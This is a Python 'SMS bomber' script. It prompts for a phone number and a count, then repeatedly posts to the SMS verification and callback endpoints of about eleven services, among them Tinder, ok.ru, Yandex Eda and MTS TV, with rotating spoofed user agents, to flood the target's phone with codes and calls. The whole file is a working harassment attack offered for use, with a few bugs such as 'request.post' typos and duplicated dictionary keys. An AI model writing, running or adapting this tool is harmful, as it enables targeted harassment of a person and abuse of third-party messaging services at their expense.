import random
import requests
import os
import sys
import rich
import json
import banner

from rich.console import Console
from rich.prompt import Prompt

console = Console()

heads = [
       {'User_Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
       'Accept': '*/*'},
       {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
       'Accept': '*/*'}
]

def Bomber():

    try:
       number = int(console.input("[bold red]Phone number[/]> "))
       sms = int(Prompt.ask(
           "[bold red]SMS quantity",
           default="10"
           )
       )

    except KeyboardInterrupt:
           console.print('Bye!')
           sys.exit()
           
    def attack(number, sms):
        number_7 = str(7) + str(number)
        number_plus7 = str(+7) + str(number)
        number_8 = str(8) + str(number)
        
        sent = 0

        while sent < sms:
              HEADERS = random.choice(heads)

              try:
                 wwork = requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": number_7, "type": 2})
                 sent += 1
                 console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print('[bold red][-] Not Sended')

              try:
                  tinder = requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
                  sent += 1
                  console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.input('[bold red][-] Not Sended')

              try:
                  gtl = requests.post('https://i-dgtl.ru/curl/sms.php', data = {'phone': number_7}, headers=HEADERS)
                  sent += 1
                  console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print('[bold red][-][/] Not Sended')

              try:
                  ievaphone = requests.post('https://ievaphone.com/call-my-phone/web/request-free-call', data = {'phone': number_7, 'phone': number_plus7, 'phone': number_8}, headers=HEADERS)
                  sent += 1
                  console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print('[bold red][-] Not Sended')

              try:
                  youla = requests.post('https://youla.ru/web-api/auth/request_code', data = {'phone': number_7, 'phone': number_8, 'phone': number_plus7}, headers=HEADERS)

                  sent += 1
                  console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print('[bold red][-] Not Sended')

              try:
                  kant = request.post('https://i-want.ru/api/auth/v1/customer/login/phone', data = {'phone': number_7}, headers=HEADERS)

                  sent += 1
                  console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print(f'[bold red][-] Not Sended') 

              try:
                 kinoland = request.post('https://api.kinoland.com.ua/api/v1/service/send-sms', data = {'phone': number_7}, headers=HEADERS) 

                 sent += 1
                 console.print(f'[bold green][+] Sended[/]: [{sent}]')
                 
              except:
                    console.print('[bold red][-] Not Sended')

              try:
                 ok = requests.post('https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone', data = {'phone': number_7}, headers=HEADERS)

                 sent += 1
                 console.print(f'[bold green][+] Sended[/]: [{sent}]') 

              except:
                    console.print('[bold red][-] Not Sended')

              try:
                  mts = requests.post('https://api.mtstv.ru/v1/users', json = {'msisdn': number_7}, headers=HEADERS)

                  sent += 1
                  console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print('[bold red][-] Not Sended')

              try:
                 yandex_eda = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json = {'phone': number_7}, headers=HEADERS)

                 sent += 1
                 console.print(f'[bold green][+] Sended[/]: [{sent}]')

              except:
                    console.print('[bold red][-] Not Sended')

              try:
                  serves = requests.post('https://www.dns-shop.ru/auth/auth/fast-authorization/', data={"FastAuthorizationLoginLoadForm[login]" : number_7}, headers=HEADERS)

                  sent += 1
                  console.print(f"[bold green][+] Sended[/]: [{sent}]")

              except:
                    console.print('[bold red][-] Not Sended')
                                   
    attack(number, sms)

Bomber()    

    
